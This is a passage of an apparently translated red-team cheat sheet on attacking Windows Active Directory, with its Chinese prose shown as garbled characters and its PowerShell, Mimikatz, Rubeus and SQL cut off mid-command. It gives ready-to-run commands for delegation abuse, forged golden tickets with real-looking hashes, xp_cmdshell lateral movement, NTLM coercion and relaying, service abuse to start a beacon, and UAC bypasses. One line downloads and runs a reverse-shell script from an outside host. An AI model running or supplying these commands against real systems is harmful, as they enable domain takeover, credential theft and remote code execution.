title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a><strong>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</strong></h3><p>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼ˆRBCDï¼‰å°†<em>åç«¯æœåŠ¡å™¨</em>ï¼ˆä¾‹å¦‚MSSQLï¼‰é…ç½®ä¸º<em>ä»…</em>å…è®¸<em>é€‰å®šçš„å‰ç«¯æœåŠ¡</em>ï¼ˆä¾‹å¦‚IISï¼‰ä»£è¡¨ç”¨æˆ·è¿›è¡Œå§”æ´¾ã€‚è¿™ä½¿ç‰¹å®šçš„æœåŠ¡å™¨ç®¡ç†å‘˜å¯ä»¥æ›´è½»æ¾åœ°é…ç½®å§”æ´¾ï¼Œè€Œæ— éœ€åŸŸç®¡ç†å‘˜æƒé™ã€‚</p><p>DACLå±æ€§ï¼š<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>s4u2self</code>å¹¶ä¸”å’Œ<code>s4u2proxy</code>ä¸€æ ·ç”¨äºä»£è¡¨ç”¨æˆ·è¯·æ±‚å¯è½¬å‘ç¥¨è¯ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨RBCDï¼ŒKDCä¼šæ£€æŸ¥<em>åç«¯æœåŠ¡</em>çš„å±æ€§ä¸­æ˜¯å¦å­˜åœ¨ç”¨äºè¯·æ±‚æœåŠ¡ï¼ˆå³<em>å‰ç«¯æœåŠ¡</em>ï¼‰çš„SPN ã€‚è¿™æ„å‘³ç€<em>å‰ç«¯æœåŠ¡</em>éœ€è¦è®¾ç½®SPNã€‚å› æ­¤ï¼Œå¿…é¡»ä»å…·æœ‰SPNçš„æœåŠ¡å¸æˆ·æˆ–è®¡ç®—æœºå¸æˆ·å¯¹RBCè¿›è¡Œæ”»å‡»ã€‚<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p><h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>å¦‚æœæˆ‘ä»¬æŸå®³å‡ºç°åœ¨<em>åç«¯æœåŠ¡</em>çš„RBCDå±æ€§ä¸­çš„<em>å‰ç«¯æœåŠ¡</em>ï¼Œåˆ™åˆ©ç”¨ä¸ä¸Šé¢çš„å—çº¦æŸå§”æ´¾ç›¸åŒã€‚ä½†æ˜¯ï¼Œè¿™ä¸å¤ªå¸¸è§ã€‚</p><p>æ›´ç»å¸¸çœ‹åˆ°æ”»å‡»RBCDæ˜¯å½“æˆ‘ä»¬æœ‰<code>GenericWrite</code>ï¼Œ<code>GenericAll</code>ï¼Œ<code>WriteProperty</code>ï¼Œæˆ–<code>WriteDACL</code>è®¸å¯åœ¨åŸŸä¸­çš„è®¡ç®—æœºå¯¹è±¡ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>åœ¨è¯¥è®¡ç®—æœºå¸æˆ·ä¸Šå†™å…¥å±æ€§ï¼Œä»¥æ·»åŠ å—ä¿¡ä»»çš„SPNæˆ–è®¡ç®—æœºå¸æˆ·ä»¥è¿›è¡Œå§”æ´¾ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„è®¡ç®—æœºå¸æˆ·å¹¶æ·»åŠ å®ƒã€‚å°±åƒä¸Šé¢çš„çº¦æŸå§”æ´¾ä¸€æ ·ï¼Œè¿™ä½¿æˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­ç ´åç›®æ ‡è®¡ç®—æœºã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create a new machine account using PowerMad</span></span><br><span class="line">New-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">'Compromised123!'</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span></span><br><span class="line"><span class="variable">$sid</span> = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid</span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$(<span class="variable">$sid</span>))"</span></span><br><span class="line"><span class="variable">$SDbytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDbytes</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span></span><br><span class="line">Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @&#123;<span class="string">'msdsallowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span></span><br><span class="line">.\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:<span class="number">3644</span>AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt</span><br></pre></td></tr></table></figure><h3 id="æ»¥ç”¨åŸŸä¿¡ä»»"><a href="#æ»¥ç”¨åŸŸä¿¡ä»»" class="headerlink" title="æ»¥ç”¨åŸŸä¿¡ä»»"></a><strong>æ»¥ç”¨åŸŸä¿¡ä»»</strong></h3><p>å¿…é¡»ä»¥DAç‰¹æƒè¿è¡Œã€‚</p><h4 id="ä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥"><a href="#ä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥" class="headerlink" title="ä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥"></a><strong>ä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥</strong></h4><p>ä»DCä¸­ï¼Œ<code>currentdomain\targetdomain$</code>ä½¿ç”¨<code>Mimikatz</code>ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨<code>LSADump</code>æˆ–<code>DCSync</code>ï¼‰è½¬å‚¨ä¿¡ä»»å¸æˆ·çš„å“ˆå¸Œã€‚ç„¶åï¼Œä½¿ç”¨æ­¤ä¿¡ä»»å¯†é’¥å’ŒåŸŸ<code>SID</code>ï¼Œä½¿ç”¨<code>Mimikatz</code>ä¼ªé€ ä¸€ä¸ªè·¨åŸŸ<code>TGT</code>ï¼Œå°†ç›®æ ‡åŸŸçš„ä¼ä¸šç®¡ç†å‘˜ç»„çš„<code>SID</code>æ·»åŠ åˆ°æˆ‘ä»¬çš„â€œ <code>SID history</code>â€ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Rubeus.</p><blockquote><p>ç¡®ä¿æ‚¨å…·æœ‰æ­£ç¡®çš„Rubeusç‰ˆæœ¬ã€‚ç”±äºæŸäº›åŸå› ï¼Œæˆ‘çš„æŸäº›ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ç»™å‡ºäº†é”™è¯¯<code>KDC_ERR_WRONG_REALM</code>ï¼Œè€ŒCRTPæä¾›çš„ç‰ˆæœ¬å¯ä»¥æ­£å¸¸å·¥ä½œã€‚</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥DCSyncç›®æ ‡åŸŸï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰ã€‚</p><h4 id="ä½¿ç”¨krbtgtå“ˆå¸Œ"><a href="#ä½¿ç”¨krbtgtå“ˆå¸Œ" class="headerlink" title="ä½¿ç”¨krbtgtå“ˆå¸Œ"></a><strong>ä½¿ç”¨krbtgtå“ˆå¸Œ</strong></h4><p>Fä»DCä¸­ï¼Œä½¿ç”¨DCSyncæˆ–LSADumpè½¬å‚¨krbtgtå“ˆå¸Œã€‚ç„¶åï¼Œåƒä»¥å‰çš„æ–¹æ³•ä¸€æ ·ï¼Œä½¿ç”¨æ­¤å“ˆå¸Œï¼Œä½¿ç”¨Mimikatzä¼ªé€ ä¸€ä¸ªè·¨åŸŸTGTã€‚</p><p>ä½¿ç”¨SIDå†å²ï¼ˆ<code>/sids</code>çš„ï¼‰<code>*-516</code>å’Œ<code>S-1-5-9</code>ä»¥ä¼ªè£…çš„åŸŸæ§åˆ¶å™¨ç»„å’Œä¼ä¸šåŸŸæ§åˆ¶å™¨åˆ†åˆ«æ˜¯åœ¨æ—¥å¿—ä¸­çš„å™ªå£°ä½ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ‚¨åœ¨åˆ›å»ºæ­¤ç¥¨è¯æ—¶é‡åˆ°é—®é¢˜ï¼Œè¯·å°è¯•æ·»åŠ â€œ targetâ€æ ‡å¿—ï¼Œä¾‹å¦‚<code>/target:moneycorp.local</code>.</p></blockquote><p>æˆ–è€…ï¼Œç”Ÿæˆå…·æœ‰EAç»„çš„SIDå†å²è®°å½•çš„åŸŸç®¡ç†å‘˜ç¥¨è¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç«‹å³DCSyncç›®æ ‡åŸŸï¼Œæˆ–ä½¿ç”¨è®¡åˆ’ä»»åŠ¡è·å–åå‘shellã€‚</p><h3 id="æ»¥ç”¨æ—é—´ä¿¡ä»»"><a href="#æ»¥ç”¨æ—é—´ä¿¡ä»»" class="headerlink" title="æ»¥ç”¨æ—é—´ä¿¡ä»»"></a><strong>æ»¥ç”¨æ—é—´ä¿¡ä»»</strong></h3><p>ç”±äºæ—æ˜¯å®‰å…¨è¾¹ç•Œï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è®¿é—®å·²ä¸æˆ‘ä»¬å…¥ä¾µçš„åŸŸï¼ˆæˆ‘ä»¬çš„æºåŸŸï¼‰å…±äº«çš„åŸŸæœåŠ¡ã€‚ä½¿ç”¨ä¾‹å¦‚BloodHoundæŸ¥æ‰¾åœ¨ä¸¤ä¸ªæ—ä¸­éƒ½å…·æœ‰å¸æˆ·ï¼ˆå…·æœ‰ç›¸åŒç”¨æˆ·åï¼‰çš„ç”¨æˆ·ï¼Œç„¶åå°è¯•é‡ç”¨å¯†ç ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerViewæ¥æœå¯»æ—ä¹‹é—´çš„å¤–éƒ¨ç»„æˆå‘˜èº«ä»½ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainForeignGroupMember -domain corp2.com</span><br></pre></td></tr></table></figure><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šåœ¨æ—ä¹‹é—´<em>ç¦ç”¨</em>SIDè¿‡æ»¤ï¼ˆå¯¼è‡´ä¸Šè¿°æƒ…å†µçš„ä¿æŠ¤ï¼‰ã€‚å¦‚æœæ‚¨è¿è¡Œ<code>Get-DomainTrust</code>å¹¶çœ‹åˆ°è¯¥<code>TREAT_AS_EXTERNAL</code>å±æ€§ï¼Œä¾¿æ˜¯è¿™ç§æƒ…å†µï¼åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼Œæ‚¨å¯ä»¥åƒåŸŸä¿¡ä»»ä¸€æ ·æ»¥ç”¨ç›®å½•æ—ä¿¡ä»»ã€‚è¯·æ³¨æ„ï¼Œæ‚¨ä»ç„¶å¯ä»¥<em>ä¸</em>ä¼ªé€ è½¦ç¥¨500å’Œ1000ä¹‹é—´çš„ä»»ä½•SIDçš„ï¼Œæ‰€ä»¥ä½ ä¸èƒ½æˆä¸ºDAï¼ˆç”šè‡³æ²¡æœ‰é—´æ¥é€šè¿‡ç»„ç»§æ‰¿ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯»æ‰¾åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæˆäºˆæœ¬åœ°ç®¡ç†å‘˜æˆ–ç±»ä¼¼éåŸŸç‰¹æƒçš„ç»„ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…<a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noopener">æ­¤åšå®¢æ–‡ç« </a>ã€‚</p><p>è¦æ¨¡æ‹Ÿæ¥è‡ªæˆ‘ä»¬æºåŸŸçš„ç”¨æˆ·ä»¥è®¿é—®å¤–éƒ¨åŸŸä¸­çš„æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚å¦‚ä¸Šè¿°â€œä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥â€ä¸­é‚£æ ·æå–æ—é—´ä¿¡ä»»å¯†é’¥ã€‚</p><p>ä½¿ç”¨Mimikatzé€šè¿‡ä¿¡ä»»å¯†é’¥ä¸ºç›®æ ‡åŸŸç”ŸæˆTGTï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œä½¿ç”¨Rubeus<code>CIFS</code>ä½¿ç”¨è¯¥TGTå‘TGSè¯¢é—®ä¾‹å¦‚ç›®æ ‡DCä¸Šçš„æœåŠ¡ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç›®æ ‡æ—çš„DCä¸Šçš„CIFSæœåŠ¡ç”¨ä½œæºåŸŸçš„DAï¼ˆåŒæ ·ï¼Œåªè¦æ­¤ä¿¡ä»»å…³ç³»å·²é…ç½®ä¸ºå­˜åœ¨ï¼‰ã€‚</p><h3 id="æ»¥ç”¨MSSQLæ•°æ®åº“è¿›è¡Œæ¨ªå‘ç§»åŠ¨"><a href="#æ»¥ç”¨MSSQLæ•°æ®åº“è¿›è¡Œæ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ»¥ç”¨MSSQLæ•°æ®åº“è¿›è¡Œæ¨ªå‘ç§»åŠ¨"></a>æ»¥ç”¨MSSQLæ•°æ®åº“è¿›è¡Œæ¨ªå‘ç§»åŠ¨</h3><p>å¯ä»¥é“¾æ¥MSSQLæ•°æ®åº“ï¼Œè¿™æ ·ï¼Œå¦‚æœæ‚¨ç ´åäº†ä¸€ä¸ªæ•°æ®åº“ï¼Œåˆ™å¯ä»¥åœ¨ç‰¹å®šç”¨æˆ·ï¼ˆ<code>sa</code>ä¹Ÿè®¸æ˜¯ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­å¯¹å…¶ä»–æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢ï¼ˆç”šè‡³å‘½ä»¤ï¼ï¼‰ã€‚è¿™ç”šè‡³å¯ä»¥è·¨æ£®æ—å·¥ä½œï¼å¦‚æœæ‰§è¡ŒSQLï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æšä¸¾æ•°æ®åº“é“¾æ¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æŸ¥æ‰¾é“¾æ¥çš„æœåŠ¡å™¨</span></span><br><span class="line">EXEC sp_linkedservers</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åœ¨é“¾æ¥æœåŠ¡å™¨ä¸Šè¿è¡ŒSQLæŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">select</span> mylogin <span class="keyword">from</span> openquery(<span class="string">"dc01"</span>, <span class="string">'select SYSTEM_USER as mylogin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šå¯ç”¨â€œ xp_cmdshellâ€å¹¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">EXEC (<span class="string">'sp_configure ''show advanced options'', 1; reconfigure'</span>) <span class="keyword">AT</span> DC01</span><br><span class="line">EXEC (<span class="string">'sp_configure ''xp_cmdshell'', 1; reconfigure'</span>) <span class="keyword">AT</span> DC01</span><br><span class="line">EXEC (<span class="string">'xp_cmdshell ''whoami'' '</span>) <span class="keyword">AT</span> DC01</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL</a>åœ¨åŸŸä¸­æŸ¥æ‰¾æ•°æ®åº“ï¼Œå¹¶æ”¶é›†æœ‰å…³ï¼ˆå¯è¾¾ï¼‰æ•°æ®åº“çš„æ›´å¤šä¿¡æ¯ã€‚æˆ‘ä»¬è¿˜å¯ä»¥è‡ªåŠ¨åœ¨é“¾æ¥çš„æ•°æ®åº“ä¸­æŸ¥æ‰¾å¹¶æ‰§è¡ŒæŸ¥è¯¢æˆ–å‘½ä»¤ï¼ˆç”šè‡³é€šè¿‡å¤šå±‚æ•°æ®åº“é“¾æ¥ï¼‰ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–åŸŸä¸­çš„MSSQLæ•°æ®åº“ï¼Œå¹¶æµ‹è¯•è¿é€šæ€§</span></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•è·å–æ‰€æœ‰åŸŸæ•°æ®åº“ä¸Šçš„ä¿¡æ¯</span></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLServerInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å•ä¸ªå¯è®¿é—®çš„æ•°æ®åº“ä¸Šè·å–ä¿¡æ¯</span></span><br><span class="line">Get-SQLServerInfo -Instance dcorp-mssql</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰«æMSSQLé”™è¯¯é…ç½®ä»¥å‡çº§åˆ°SA</span></span><br><span class="line">Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡ŒSQLæŸ¥è¯¢</span></span><br><span class="line">Get-SQLQuery -Query <span class="string">"SELECT system_user"</span> -Instance UFC-SQLDEV</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œå‘½ä»¤ï¼ˆéœ€è¦å¯ç”¨XP_CMDSHELLï¼‰</span></span><br><span class="line">Invoke-SQLOSCmd -Instance devsrv -Command <span class="string">"whoami"</span> |  select -ExpandProperty CommandResults</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªåŠ¨æŸ¥æ‰¾æ‰€æœ‰é“¾æ¥çš„æ•°æ®åº“</span></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœåœ¨ä»»ä½•é“¾æ¥çš„æ•°æ®åº“ä¸Šå¯ç”¨äº†XP_CMDSHELLï¼Œåˆ™è¿è¡Œå‘½ä»¤</span></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span class="string">'EXEC xp_cmdshell "whoami"'</span> | select instance,links,customquery | ft</span><br><span class="line"></span><br><span class="line">Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query <span class="string">'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring('</span><span class="string">'http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'</span><span class="string">')"'</span> | select instance,links,customquery | ft</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‚¨å…·æœ‰å¯¹MSSQLæ•°æ®åº“çš„ä½ç‰¹æƒè®¿é—®æƒé™ï¼Œå¹¶ä¸”ä¸å­˜åœ¨ä»»ä½•é“¾æ¥ï¼Œåˆ™æœ‰å¯èƒ½é€šè¿‡ä½¿ç”¨<code>xp_dirtree</code>å­˜å‚¨è¿‡ç¨‹è®¿é—®æ­¤å…±äº«æ¥å¼ºåˆ¶æ‰§è¡ŒNTLMèº«ä»½éªŒè¯ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™å¯ä»¥æ”¶é›†SQLæœåŠ¡å¸æˆ·çš„NetNTLMï¼Œå¹¶å¯èƒ½å°†å…¶ç ´è§£æˆ–ä¸­ç»§ï¼Œä»¥ç ´åä½œä¸ºè¯¥æœåŠ¡å¸æˆ·çš„è®¡ç®—æœºã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_dirtree "\\192.168.49.67\share"</span><br></pre></td></tr></table></figure><p>ä¸­ç»§å“ˆå¸Œä»¥é€šè¿‡èº«ä»½éªŒè¯ä¸ºæœ¬åœ°adminçš„ç¤ºä¾‹å‘½ä»¤ï¼ˆå¦‚æœæœåŠ¡å¸æˆ·å…·æœ‰è¿™äº›ç‰¹æƒï¼‰å¹¶è¿è¡Œ<code>calc.exe</code>ã€‚å¿½ç•¥è¯¥<code>-c</code>å‚æ•°å°è¯•å°è¯•<code>secretsdump</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span class="string">'calc.exe'</span></span><br></pre></td></tr></table></figure><h2 id="ç‰¹æƒæå‡"><a href="#ç‰¹æƒæå‡" class="headerlink" title="ç‰¹æƒæå‡"></a>ç‰¹æƒæå‡</h2><p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼ˆåŒ…æ‹¬Windowså’ŒLinuxï¼‰ï¼Œè¯·å‚é˜…æˆ‘çš„<a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/" target="_blank" rel="noopener">OSCPå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ</a>ã€‚</p><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ£€æŸ¥æ˜“å—æ”»å‡»çš„ç¨‹åºå’Œé…ç½®</span></span><br><span class="line">Invoke-AllChecks</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡æƒé™ï¼ˆä¸éœ€è¦è§¦æ‘¸ç£ç›˜ï¼‰</span></span><br><span class="line">Invoke-ServiceAbuse -Name <span class="string">"AbyssWebServer"</span> -Command <span class="string">"net localgroup Administrators domain\user /add"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡æƒé™è§¦å‘ç¨³å®šçš„beacon</span></span><br><span class="line">Write-ServiceBinary -Name <span class="string">'AbyssWebServer'</span> -Command <span class="string">'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update'</span> -Path <span class="string">'C:\WebServer\Abyss'</span></span><br><span class="line">net stop AbyssWebServer</span><br><span class="line">net start AbyssWebServer</span><br></pre></td></tr></table></figure><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass  UAC"></a>Bypass  UAC</h3><p>ä½¿ç”¨<a href="https://github.com/FatRodzianko/SharpBypassUAC" target="_blank" rel="noopener">SharpBypassUAC</a>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”ŸæˆEncodedCommand</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update'</span> | base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ SharpBypassUAC e.g. ä»CobaltStrike çš„ä¸€ä¸ªbeacon</span></span><br><span class="line">beacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==</span><br></pre></td></tr></table></figure><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿è¡Œæ‰‹åŠ¨Bypass  UAC ï¼ˆä¾‹å¦‚FODHelper bypassï¼‰å¯èƒ½ä¼šå˜å¾—æ›´å¥½ï¼Œè€ŒFODHelperæ—è·¯åœ¨PowerShellä¸­æ‰§è¡Œèµ·æ¥éå¸¸ç®€å•ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The command to execute in high integrity context</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">"cmd /c start powershell.exe"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set the registry values</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Force</span><br><span class="line"><span class="built_in">New-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Name <span class="string">"DelegateExecute"</span> -Value <span class="string">""</span> -Force</span><br><span class="line"><span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> -Name <span class="string">"(default)"</span> -Value <span class="variable">$cmd</span> -Force</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Trigger fodhelper to perform the bypass</span></span><br><span class="line"><span class="built_in">Start-Process</span> 